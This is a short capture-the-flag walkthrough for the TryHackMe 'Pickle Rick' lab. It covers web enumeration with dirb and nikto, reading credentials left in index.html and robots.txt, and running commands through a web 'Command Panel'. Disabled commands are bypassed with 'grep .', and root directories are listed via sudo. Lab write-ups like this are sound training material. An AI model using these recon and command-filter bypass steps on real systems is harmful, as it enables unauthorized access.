# [Pickle Rick](https://tryhackme.com/r/room/picklerick)

* Set the machine IP in an environment variable:
  ```shell
  export MACHINE_IP=x.x.x.x
  ```

**What is the first ingredient that Rick needs?**

* Use [dirb](https://www.kali.org/tools/dirb/) to check for common paths on the webserver:

  ```shell
  dirb http://$MACHINE_IP

  ...
  > DIRECTORY: http://x.x.x.x/assets/
  + http://x.x.x.x/index.html (CODE:200|SIZE:1062)                       
  + http://x.x.x.x/robots.txt (CODE:200|SIZE:17)                         
  + http://x.x.x.x/server-status (CODE:403|SIZE:278)    
  ...
  ```

* Find the username in index.html:

  ```shell
  curl -s http://$MACHINE_IP/index.html | grep Username
  ```

* Find the password in robots.txt:

  ```shell
  curl -s http://$MACHINE_IP/robots.txt
  ```

* Use [nikto](https://www.kali.org/tools/nikto/) to check more stuff: 

  ```shell
  nikto -h $MACHINE_IP

  ...
  /login.php: Admin login page/section found
  ...
  ```

* Go to /login.php
* Execute `ls` in the "Command Panel":

  ```
  Sup3rS3cretPickl3Ingred.txt
  assets
  clue.txt
  denied.php
  index.html
  login.php
  portal.php
  robots.txt
  ```

* If we try to execute `cat`, `head`, `tail`, ... it says those commands are "disabled"
* Try any other alternative, for example `grep . Sup3rS3cretPickl3Ingred.txt` works!
* Execute `grep . clue.txt`:

  ```
  Look around the file system for the other ingredient.
  ```

* Execute `ls` navigating different directories until you find something
* Try `ls -R /home` and `sudo ls -R /root` and once you find the files just execute `grep .` on them!
